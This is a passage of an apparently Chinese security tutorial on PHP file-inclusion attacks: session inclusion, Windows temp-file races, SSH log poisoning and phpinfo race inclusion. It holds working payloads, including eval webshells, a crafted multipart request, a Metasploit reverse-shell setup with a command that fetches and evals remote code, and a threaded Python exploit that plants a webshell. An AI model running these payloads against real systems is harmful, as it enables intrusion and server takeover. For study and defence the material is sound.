&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into user(username, password) values(?,?)&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>两个文件都是用 PDO 写的，不存在 sql 注入，config 是数据库用户名与密码，除非他的服务器允许外链，不然没用，index 就包含了两个页面</p>
+<p>但我们注意到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$res_password</span> == <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid user name or password&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里使用了 session 来保存用户会话，php 手册中是这样描述的：</p>
+<ol>
+<li>PHP 会将会话中的数据设置到  <code>$_SESSION</code>  变量中。</li>
+<li>当 PHP 停止的时候，它会自动读取  <code>$_SESSION</code>  中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>
+<li>对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>
+</ol>
+</blockquote>
+<p>把我们的用户名 base64 编码后放到了 session 中</p>
+<p>那么可能存在 session 包含了，session 包含的两个条件：1. 知道物理路径与 session 名称，物理路径我们是知道的，session 名称我们可以 f12 查看 2.session 可以写入并且被包含，这一点我们也是满足的</p>
+<p>这样我们可以注册的时候用户名写我们的 php 代码，然后通过 session 包含</p>
+<p>但 session 中是 base64 编码后的，不能直接包含，我们需要在包含前解码，php://filter 就是个很好的解码方法</p>
+<p>注册如下用户名： <code>hahaha</code> ，密码随便写，最终在数据库中的是： <code>username|s:12:&quot;xxxxxxx&quot;</code> xxx 为我们用户名的 base64 编码，12 是 base64 编码的长度</p>
+<p>但 base64 是有特性的他必须 8 位为一组，如果不够会把后面的字符抓过来，此时 <code>username|s:12:&quot;</code>  正好是 15 个字符，为了增加一个字符，我们需要扩展我们的用户名，让他 base64 之后为 100 字符以上，这样我们前 16 个字符被解码为乱码，我们的 php 被正确包含</p>
+<p>比如： <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;?php eval($_GET['aaaaaa']) ?&gt;</code></p>
+<p>然后解码，正确包含</p>
+<p><code>http://1.1.1.1/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;aaaaaa=phpinfo();</code></p>
+<p>防御 session：</p>
+<p>修改 session 默认路径和名称</p>
+<p>设置 session 文件夹权限</p>
+<h2 id="临时文件包含"><a class="markdownIt-Anchor" href="#临时文件包含">#</a> 临时文件包含</h2>
+<p>当文件上传时，先存储到临时文件夹，在移动到网站目录下，我们可以通过竞争在删除之前包含，文件名通过通配符找到</p>
+<p>1. 先上传文件</p>
+<p>2. 通过 file 覆盖前一个文件，匹配临时文件</p>
+<p>3. 包含临时文件</p>
+<p>如果是自己的 phpstudy 默认是没有开启</p>
+<p>我们需要修改 upload_tmp_dir = “C:\Windows\Temp”</p>
+<p>然后利用文件上传产生的缓存文件进行命令执行，从而 getshell</p>
+<p>假设我们有一个前端页面可以上传文件，后端可以接收上传的文件并进行包含，那么我们就可以利用文件上传时上传到临时目录，在删除之前通过竞争包含</p>
+<p>我们需要解决几个问题：</p>
+<p>1. 如何找到我们的临时文件？</p>
+<p>通过 &gt;，在 Windows 中 &gt; 可以当做通配符使用，很巧，php 的临时文件长这样 php678u，那么我们可以这样匹配 php&gt;&gt;&gt;</p>
+<p>2. 即使我们访问到临时文件，他依然会删除，怎么解决？</p>
+<p>往他网站根目录下写 php 文件，即使我们的临时文件删除了，只要在删除之前包含了，那么我们在网站根目录下的文件就会生成</p>
+<p><code>&lt;?php fputs(fopen('E:\phpstudy_pro\www\aaaaa.php','w'),'&lt;?php phpinfo(); ?&gt;'); ?&gt;</code></p>
+<p>3. 如何构造上传包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /xss_location/include/windows.php HTTP/1.1</span><br><span class="line">Host: 172.16.60.64</span><br><span class="line">Content-Length: 481</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://172.16.60.64</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://172.16.60.64/xss_location/include/windows.html</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=s3pod5ho262o336afdd8ljvkg7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(&#x27;E:\phpstudy_pro\www\aaaaa.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo(); ?&gt;&#x27;); ?&gt;</span><br><span class="line">yes</span><br><span class="line">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class="line"></span><br><span class="line">C:\Windows\Temp\php&lt;&lt;&lt;&lt;</span><br><span class="line">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary163SaL5Buko78Yfw--</span><br></pre></td></tr></table></figure>
+<p>注意：下面几行是需要我们自己构造的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yes</span><br><span class="line">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class="line"></span><br><span class="line">C:\Windows\Temp\php&lt;&lt;&lt;&lt;</span><br></pre></td></tr></table></figure>
+<p>yes 的作用是包含成功后的提示符</p>
+<p>name=file 是为了覆盖上一个 name=file，然后匹配临时文件</p>
+<p>php&gt;&gt;&gt;&gt; 就是通配符了，上面解释过</p>
+<p>记得空行的问题，如果报错尝试删除或增加空行</p>
+<p>补充一下 windows 匹配</p>
+<blockquote>
+<p>DOS_STAR：即 &lt;，匹配 0 个以上的字符<br>
+ DOS_QM：即 &gt;，匹配 1 个字符<br>
+ DOS_DOT：即 &quot;，匹配点号</p>
+</blockquote>
+<p>如果他的 php.ini 下没有设置 upload 这个东西的路径并且还有；，也就是没有设置。</p>
+<p>那么我们也可以直接读取任意文件</p>
+<p>其实也没必要非得文件上传了，本来文件包含后就可以读取了</p>
+<p>临时文件包含条件：</p>
+<blockquote>
+<p>1.php.ini 中的 upload_tmp_dir 下必须有 C:/Windows/Temp 这个路径</p>
+<p>2. 得有写入的权限（这个默认应该都可以）</p>
+<p>3.$_REQUEST 得有，因为他是获取表单信息的一个数组，如果没有它，那么我们就不能进行文件上传来打。</p>
+</blockquote>
+<h2 id="ssh文件包含"><a class="markdownIt-Anchor" href="#ssh文件包含">#</a> SSH 文件包含</h2>
+<p>假设有如下文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];   </span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))   &#123;       </span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>);   </span><br><span class="line">    &#125;   <span class="keyword">else</span>   &#123;       </span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;index.php&quot;</span>);   </span><br><span class="line">    &#125;   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那么我们就可以包含任意文件，比如 /etc/passwd</p>
+<p><code>[101.35.139.208:9999/lfi.php?file=file:///etc/passwd](http://101.35.139.208:9999/lfi.php?file=file:///etc/passwd)</code></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191034602.png" alt="image-20221031191034602"></p>
+<p>那么意味着我们其实也可以包含 ssh log</p>
+<p>先看一眼 ssh log 里面有啥</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191351374.png" alt="image-20221031191351374"></p>
+<p>加入我们登录时构造这样的用户名 <code>ssh root&lt;?php phpinfo();?&gt;@101.35.139.208</code></p>
+<p>那么在我们的 ssh log 中就会存在以下日志</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191502317.png" alt="image-20221031191502317"></p>
+<p>试着包含一下？</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191635298.png" alt="image-20221031191635298"></p>
+<p>但是文件很大，你忍一下</p>
+<p>记得在包含前，设置文件的权限 <code>chmod 775 secure</code></p>
+<p>也可以写马，比如</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192425893.png" alt="image-20221031192425893"></p>
+<p>如果报错 <code>system() has been disabled for security reasons </code> ，无法包含，</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192854594.png" alt="image-20221031192854594"></p>
+<p>把这里的 disable_function 中的你需要使用的函数去掉，重启</p>
+<p><code>service php-fpm restart</code></p>
+<p>web 传递  cs msf</p>
+<p>msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit (web_delivery)&gt;set target 1</span><br><span class="line">msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; set lhost 192.168.1.123</span><br><span class="line">msf exploit (web_delivery)&gt;set srvport 8081</span><br><span class="line">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>
+<p>执行 msf 给出的命令</p>
+<p><code>http://10.128.50.84:18888/lfi.php?file=./shabi.php&amp;cmd=php -d allow_url_fopen=true -r &quot;eval(file_get_contents('http://192.168.13.133:9891/GEZgpb8cVDe', false, stream_context_create(['ssl'=&gt;['verify_peer'=&gt;false,'verify_peer_name'=&gt;false]])));&quot;</code></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031201754444.png" alt="image-20221031201754444"></p>
+<p>CS web delivery</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101145322747.png" alt="image-20221101145322747" style="zoom:80%;" />
+<h2 id="包含procselfenviron"><a class="markdownIt-Anchor" href="#包含procselfenviron">#</a> 包含 / PROC/SELF/ENVIRON</h2>
+<p>并不能包含这东西～</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos CobaltStrike4.1]# ls -al /proc/self/environ </span><br><span class="line">-r-------- 1 root root 0 Nov  1 14:56 /proc/self/environ</span><br></pre></td></tr></table></figure>
+<p>而且不能 chmod 改变权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos CobaltStrike4.1]# chmod 755 /proc/self/environ </span><br><span class="line">chmod: changing permissions of ‘/proc/self/environ’: Operation not permitted</span><br></pre></td></tr></table></figure>
+<p>也不能修改特殊权限位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos CobaltStrike4.1]# lsattr /proc/self/environ </span><br><span class="line">lsattr: Inappropriate ioctl for device While reading flags on /proc/self/environ</span><br></pre></td></tr></table></figure>
+<p>关于 chattr</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos lighthouse]# chattr +i 11111.exe </span><br><span class="line">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br><span class="line">rm: cannot remove ‘11111.exe’: Operation not permitted</span><br><span class="line">[root@VM-16-11-centos lighthouse]# lsattr 11111.exe </span><br><span class="line">----i--------e-- 11111.exe</span><br><span class="line">[root@VM-16-11-centos lighthouse]# chattr -i 11111.exe</span><br><span class="line">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br></pre></td></tr></table></figure>
+<h2 id="phpinfo文件包含"><a class="markdownIt-Anchor" href="#phpinfo文件包含">#</a> phpinfo 文件包含</h2>
+<p>php 5.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Configuration File (php.ini) Path	C:\Windows</span><br><span class="line">Loaded Configuration File	D:\BtSoft\php\54\php.ini</span><br><span class="line">PHP Version	5.4.45</span><br><span class="line">allow_url_fopen	On	On</span><br><span class="line">allow_url_include	On	On</span><br><span class="line">session.save_path	D:\BtSoft\temp\session	D:\BtSoft\temp\session</span><br><span class="line">disable_functions	no value	no value</span><br><span class="line">_SERVER[&quot;*********&quot;]	C:\Windows</span><br></pre></td></tr></table></figure>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMToxODg4OC9waHBpbmZvLnBocA==">http://127.0.0.1:18888/phpinfo.php</span> 我们可以向 phpinfo 中 post 参数，虽然没有接收，但会生成临时文件，我们可以利用时间竞争包含</p>
+<p>当然可以向任意 php 文件 post 文件，服务器都会将他保存到一个临时文件中，只是如果没有 phpinfo，临时文件名很难猜。然而 phpinfo 中会有文件名和路径的输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;&lt;?php echo &#x27;yanchuang is cool!&#x27;;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://172.16.60.64/xss_location/include/phpinfo.php&quot;</span></span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">data = re.search(<span class="string">&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;</span>, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)).group(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+<p>为了延缓删除临时文件，我们需要 post 更长的文件，通知启用大量线程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">    TAG = <span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD = <span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php fputs(fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[a]);&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA = <span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding = <span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1 = <span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> % (<span class="built_in">len</span>(REQ1_DATA), host, REQ1_DATA)</span><br><span class="line">    <span class="comment"># modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ = <span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i + <span class="number">17</span>:i + <span class="number">44</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock = l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d += i</span><br><span class="line">        <span class="keyword">if</span> i == <span 